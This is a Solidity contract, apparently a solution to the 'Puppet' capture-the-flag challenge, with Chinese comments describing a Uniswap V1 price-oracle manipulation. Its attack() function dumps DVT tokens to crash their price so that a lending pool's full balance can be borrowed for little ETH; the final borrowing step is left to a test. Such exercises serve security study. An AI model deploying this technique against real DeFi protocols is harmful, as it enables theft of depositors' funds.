// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address, address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV1 {
    function tokenToEthSwapInput(uint256, uint256, uint256) external returns (uint256);
    function ethToTokenSwapInput(uint256, uint256) external payable returns (uint256);
}

/**
 * @title PuppetChallenge
 * @notice 利用 Uniswap V1 价格预言机操纵
 * 
 * 漏洞：PuppetPool 使用 Uniswap V1 单池价格作为预言机，可被操纵
 * 攻击：大量卖出 DVT → ETH 价格暴跌 → 少量 ETH 就能借走全部 DVT
 */
contract PuppetChallenge {
    IERC20 token;
    IUniswapV1 uniswap;
    address pool;
    address attacker;
    
    constructor(address _token, address _uniswap, address _pool) public {
        token = IERC20(_token);
        uniswap = IUniswapV1(_uniswap);
        pool = _pool;
        attacker = msg.sender;
    }
    
    function attack(uint256 amount) external {
        // 预先从 attacker 接收 DVT
        token.transferFrom(attacker, address(this), amount);
        
        // 在 Uniswap 上大量卖出 DVT，拉低价格
        token.approve(address(uniswap), amount);
        uniswap.tokenToEthSwapInput(amount, 1, block.timestamp + 1);
        
        // 现在可以用极少 ETH 借走 pool 中所有 DVT
        // 这一步在 test 中完成
        payable(attacker).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
